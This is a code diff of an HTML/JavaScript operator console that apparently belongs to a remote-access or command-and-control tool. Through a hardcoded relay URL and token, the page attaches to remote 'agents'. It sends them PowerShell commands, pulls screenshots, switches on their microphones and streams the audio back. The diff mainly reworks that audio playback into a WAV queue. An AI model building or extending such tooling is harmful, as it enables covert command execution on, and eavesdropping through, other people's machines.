@@ -1,6 +1,6 @@
 <!doctype html>
 <html><head><meta charset="utf-8">
-<title>ops</title>
+<title>Operator</title>
 <style>
   body{font-family:ui-monospace,monospace;background:#111;color:#ddd;margin:0;padding:16px}
   #hdr{display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
@@ -14,6 +14,7 @@
   #micwrap{display:flex;gap:6px;align-items:center;margin-top:8px}
   #vu{width:160px;height:10px;background:#222;border:1px solid #333}
   #vu>div{height:100%;width:0%;background:#0f0;transition:width .05s linear}
+  #audstat{color:#888;font-size:12px}
 </style></head>
 <body>
 <div id="hdr">
@@ -31,11 +32,13 @@
 <div id="micwrap">
   <span style="color:#888;font-size:12px">mic VU:</span>
   <div id="vu"><div></div></div>
-  <span style="color:#888;font-size:12px" id="audstat">audio: idle</span>
+  <span id="audstat">audio: idle</span>
+  <span style="color:#888;font-size:12px" id="stats2">chunks:0 played:0 dropped:0 q:0</span>
 </div>
 <div id="out"></div>
 <input id="cmd" placeholder="PowerShell — press Enter to send">
 <img id="shot" alt="">
+<audio id="aud" autoplay></audio>
 
 <script>
 // =========================================================================
@@ -45,14 +48,15 @@ const RELAY = "wss://operator-nmth.onrender.com/ws";
 const TOKEN = "jf8CL2Cfgl3Wrfng1wbZ1aRXjEb225c8TCS/7HDbry0=";
 
 // =========================================================================
-// DOM refs
+// DOM
 // =========================================================================
-const outEl    = document.getElementById('out');
-const agentsEl = document.getElementById('agents');
-const shotEl   = document.getElementById('shot');
-const statusEl = document.getElementById('status');
-const vuEl     = document.querySelector('#vu > div');
-const audstatEl= document.getElementById('audstat');
+const outEl     = document.getElementById('out');
+const agentsEl  = document.getElementById('agents');
+const shotEl    = document.getElementById('shot');
+const statusEl  = document.getElementById('status');
+const vuEl      = document.querySelector('#vu > div');
+const audstatEl = document.getElementById('audstat');
+const stats2El  = document.getElementById('stats2');
 
 // =========================================================================
 // State
@@ -61,27 +65,37 @@ let ws = null;
 let attachedId = null;
 let frames = 0;
 let outs = 0;
+let micOn = false;
+let muted = false;
+
+// PCM/WAV playback
 let pcmChunks = 0;
 let pcmPlayed = 0;
 let pcmDropped = 0;
-let micOn = false;
-let muted = false;
 let lastPeak = 0;
 
-let audioCtx = null;
-let nextTime = 0;
-const jitterBuffer = 0.12;
+// Sliding PCM accumulator
+const MIC_RATE = 16000;
+const MIC_CH   = 1;
+const MIC_BITS = 16;
+const WINDOW_MS = 250;                         // bundle 250 ms per WAV
+const WINDOW_SAMPLES = MIC_RATE * WINDOW_MS / 1000;
+let pcmRing = new Int16Array(0);               // rolling samples
+const wavQueue = [];                           // pending WAV URLs
+let audioEl = document.getElementById('aud');
+audioEl.volume = 1.0;
 
 // =========================================================================
 // Helpers
 // =========================================================================
-function log(s){
-  outEl.textContent += s + "\n";
-  outEl.scrollTop = outEl.scrollHeight;
-}
+function log(s){ outEl.textContent += s + "\n"; outEl.scrollTop = outEl.scrollHeight; }
 function setStatus(s){ statusEl.textContent = s; }
 function refreshStatus(){
   setStatus(`attached:${attachedId||'none'}  frames:${frames}  outs:${outs}  pcm:${pcmChunks}`);
+}
+function refreshStats2(){
+  stats2El.textContent =
+    `chunks:${pcmChunks} played:${pcmPlayed} dropped:${pcmDropped} q:${wavQueue.length}`;
 }
 function b64ToU8(b64){
   const bin = atob(b64);
@@ -94,98 +108,120 @@ function u8ToB64(u8){
   for (const b of u8) bin += String.fromCharCode(b);
   return btoa(bin);
 }
-function audstat(s){ audstatEl.textContent = 'audio: ' + s; }
 
 // =========================================================================
-// Audio — gesture-bound, primed
+// PCM -> WAV blob (RFC 2361 / RIFF)
 // =========================================================================
-function makeAudioContext(){
-  if (audioCtx) return audioCtx;
-  audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  nextTime = audioCtx.currentTime + jitterBuffer;
-  audioCtx.onstatechange = () => audstat(audioCtx.state);
-  audstat(audioCtx.state);
-  return audioCtx;
+function pcmToWavBlob(pcmBytes, rate, ch, bits){
+  const dataLen = pcmBytes.length;
+  const buf = new ArrayBuffer(44 + dataLen);
+  const view = new DataView(buf);
+  const w = (o, s) => { for (let i = 0; i < s.length; i++) view.setUint8(o+i, s.charCodeAt(i)); };
+  w(0, 'RIFF');
+  view.setUint32(4, 36 + dataLen, true);
+  w(8, 'WAVE');
+  w(12, 'fmt ');
+  view.setUint32(16, 16, true);
+  view.setUint16(20, 1, true);                             // PCM
+  view.setUint16(22, ch, true);
+  view.setUint32(24, rate, true);
+  view.setUint32(28, rate * ch * bits / 8, true);          // byte rate
+  view.setUint16(32, ch * bits / 8, true);                 // block align
+  view.setUint16(34, bits, true);
+  w(36, 'data');
+  view.setUint32(40, dataLen, true);
+  new Uint8Array(buf, 44).set(pcmBytes);
+  return new Blob([buf], { type: 'audio/wav' });
 }
 
-async function primeAudioOnGesture(){
-  const ctx = makeAudioContext();
-  const p = ctx.state !== 'running' ? ctx.resume().catch(()=>{}) : Promise.resolve();
-  try {
-    const b = ctx.createBuffer(1, 1, 22050);
-    const s = ctx.createBufferSource();
-    s.buffer = b;
-    s.connect(ctx.destination);
-    s.start(0);
-  } catch {}
-  await p;
-  audstat(ctx.state);
-}
-
-// Prime on ANY user gesture — first click/key anywhere flips the ctx.
-window.addEventListener('pointerdown', () => { primeAudioOnGesture(); }, true);
-window.addEventListener('keydown',     () => { primeAudioOnGesture(); }, true);
-
-function playPcmChunk(b64, rate, ch){
+// =========================================================================
+// PCM ring buffer. Push samples; when >= WINDOW_SAMPLES, drain to WAV and queue.
+// =========================================================================
+function pushPcmIntoRing(b64, rate, ch){
   if (muted) return;
-  const ctx = makeAudioContext();
+  const bytes = b64ToU8(b64);
+  const n = bytes.length >> 1;
 
-  if (ctx.state !== 'running') {
-    ctx.resume().catch(()=>{});
-    pcmDropped++;
-    return;
-  }
-
-  const bin = atob(b64);
-  const n = bin.length >> 1;
-  if (n <= 0) return;
-
-  const i16 = new Int16Array(n);
-  for (let i = 0; i < n; ++i) {
-    let v = bin.charCodeAt(i*2) | (bin.charCodeAt(i*2+1) << 8);
-    if (v & 0x8000) v |= ~0xffff;
-    i16[i] = v;
-  }
-
-  const f32 = new Float32Array(n);
+  // track peak of the incoming chunk
   let peak = 0;
-  for (let i = 0; i < n; ++i) {
-    const s = i16[i] / 32768.0;
-    f32[i] = s;
-    const a = s < 0 ? -s : s;
+  for (let i = 0; i < n; i++) {
+    let v = bytes[i*2] | (bytes[i*2+1] << 8);
+    if (v & 0x8000) v |= ~0xffff;
+    const a = (v < 0 ? -v : v) / 32768;
     if (a > peak) peak = a;
   }
   lastPeak = peak;
   if (vuEl) vuEl.style.width = Math.min(100, Math.round(peak * 100)) + '%';
 
-  const channels = ch || 1;
-  const frameRate = rate || 16000;
-  const buf = ctx.createBuffer(channels, Math.max(1, n / channels), frameRate);
-  buf.copyToChannel(f32, 0);
+  // append to ring (Int16Array; grow as needed)
+  const needed = pcmRing.length + n;
+  if (needed > pcmRing.length) {
+    const next = new Int16Array(needed);
+    next.set(pcmRing, 0);
+    pcmRing = next;
+  }
+  const base = pcmRing.length - n;
+  for (let i = 0; i < n; i++) {
+    let v = bytes[i*2] | (bytes[i*2+1] << 8);
+    if (v & 0x8000) v |= ~0xffff;
+    pcmRing[base + i] = v;
+  }
 
-  const src = ctx.createBufferSource();
-  src.buffer = buf;
-  src.connect(ctx.destination);
+  // drain full windows to WAV chunks
+  while (pcmRing.length >= WINDOW_SAMPLES) {
+    const slice = pcmRing.subarray(0, WINDOW_SAMPLES);
+    const bytesOut = new Uint8Array(WINDOW_SAMPLES * 2);
+    for (let i = 0; i < WINDOW_SAMPLES; i++) {
+      const s = slice[i];
+      bytesOut[i*2]   = s & 0xff;
+      bytesOut[i*2+1] = (s >> 8) & 0xff;
+    }
+    const blob = pcmToWavBlob(bytesOut, MIC_RATE, MIC_CH, MIC_BITS);
+    const url  = URL.createObjectURL(blob);
+    wavQueue.push(url);
+    pcmRing = pcmRing.subarray(WINDOW_SAMPLES);
+    pcmRing = new Int16Array(pcmRing);   // detach from subarray view
 
-  const now = ctx.currentTime;
-  if (nextTime < now) nextTime = now + jitterBuffer;
-  if (nextTime - now > 0.2) nextTime = now + jitterBuffer; // drop backlog
-  src.start(nextTime);
-  nextTime += buf.duration;
-  pcmPlayed++;
+    maybePlayNext();
+  }
 }
 
-// debug helper
-window.__dbg = function(){
-  return {
-    ctxState:  audioCtx ? audioCtx.state : 'none',
-    ctxRate:   audioCtx ? audioCtx.sampleRate : 0,
-    micOn, muted,
-    pcmChunks, pcmPlayed, pcmDropped,
-    lastPeak:  lastPeak.toFixed(3),
-    nextTime:  audioCtx ? (nextTime - audioCtx.currentTime).toFixed(3) : 0
+// =========================================================================
+// Play the queue back-to-back with a single <audio> element
+// =========================================================================
+let playing = false;
+function maybePlayNext(){
+  if (playing || wavQueue.length === 0) return;
+  const url = wavQueue.shift();
+  audioEl.src = url;
+  audioEl.onended = () => {
+    URL.revokeObjectURL(url);
+    playing = false;
+    maybePlayNext();
   };
-};
+  audioEl.onerror = () => {
+    URL.revokeObjectURL(url);
+    playing = false;
+    maybePlayNext();
+  };
+  audioEl.play().then(() => {
+    playing = true;
+    pcmPlayed++;
+    refreshStats2();
+  }).catch(err => {
+    // autoplay blocked — flip a hint in the UI
+    audstatEl.textContent = 'audio: blocked (' + (err && err.name || 'unknown') + ')';
+    URL.revokeObjectURL(url);
+    playing = false;
+    setTimeout(maybePlayNext, 250);
+  });
+  audstatEl.textContent = 'audio: playing';
+}
+
+// Priming: any click on the page unlocks autoplay via the audio element.
+window.addEventListener('pointerdown', () => {
+  audioEl.play().catch(()=>{});
+}, true);
 
 // =========================================================================
 // Connect
@@ -245,8 +281,9 @@ document.getElementById('connect').onclick = () => {
 
     } else if (m.op === 'pcm') {
       pcmChunks++;
-      playPcmChunk(m.data, m.rate || 16000, m.ch || 1);
-      if ((pcmChunks % 25) === 0) refreshStatus();
+      if (!micOn) return;
+      pushPcmIntoRing(m.data, m.rate || MIC_RATE, m.ch || MIC_CH);
+      if ((pcmChunks % 25) === 0) refreshStats2();
     }
   };
 };
@@ -267,8 +304,7 @@ agentsEl.onchange = () => {
 // =========================================================================
 document.getElementById('cmd').addEventListener('keydown', (e) => {
   if (e.key !== 'Enter') return;
-  const text = e.target.value;
-  e.target.value = '';
+  const text = e.target.value; e.target.value = '';
   if (!text) return;
   if (!attachedId) { log("[no target]"); return; }
   if (!ws || ws.readyState !== 1) { log("[ws down]"); return; }
@@ -297,28 +333,18 @@ document.getElementById('shot3').onclick = () => {
 };
 
 // =========================================================================
-// Mic
+// Mic — pack-and-play. No AudioContext. Pure WAV blob queue.
 // =========================================================================
-document.getElementById('mic1').onclick = async () => {
+document.getElementById('mic1').onclick = () => {
   if (!attachedId || !ws) { log("[no target]"); return; }
-
-  // Synchronous gesture work first.
-  const ctx = makeAudioContext();
-  const p = ctx.state !== 'running' ? ctx.resume().catch(()=>{}) : Promise.resolve();
-  try {
-    const b = ctx.createBuffer(1, 1, 22050);
-    const s = ctx.createBufferSource();
-    s.buffer = b;
-    s.connect(ctx.destination);
-    s.start(0);
-  } catch {}
-
-  await p;
-  log("[mic] ON  (ctx=" + ctx.state + ", rate=" + ctx.sampleRate + ")");
-  audstat(ctx.state);
-
+  pcmRing = new Int16Array(0);
+  wavQueue.length = 0;
+  // unlock autoplay with a real gesture
+  audioEl.play().catch(()=>{});
   micOn = true;
   ws.send(JSON.stringify({op:'mic', on:true}));
+  audstatEl.textContent = 'audio: armed';
+  log("[mic] ON — packing WAVs, " + WINDOW_MS + " ms per chunk");
 };
 
 document.getElementById('mic2').onclick = () => {
@@ -331,6 +357,7 @@ document.getElementById('mic2').onclick = () => {
 document.getElementById('mute').onclick = () => {
   muted = !muted;
   document.getElementById('mute').textContent = muted ? '🔊' : '🔇';
+  if (muted) { audioEl.pause(); audioEl.src = ''; wavQueue.length = 0; }
   if (vuEl) vuEl.style.width = '0%';
 };
 
@@ -342,5 +369,20 @@ document.getElementById('kill').onclick = () => {
   ws.send(JSON.stringify({op:'kill'}));
   log("[kill] sent");
 };
+
+// debug
+window.__dbg = function(){
+  return {
+    micOn, muted,
+    pcmChunks, pcmPlayed, pcmDropped,
+    lastPeak: lastPeak.toFixed(3),
+    ringSamples: pcmRing.length,
+    queue: wavQueue.length,
+    playing,
+    audioSrcLen: audioEl.src.length,
+    audioPaused: audioEl.paused,
+    audioReadyState: audioEl.readyState
+  };
+};
 </script>
-</body></html>	
+</body></html>
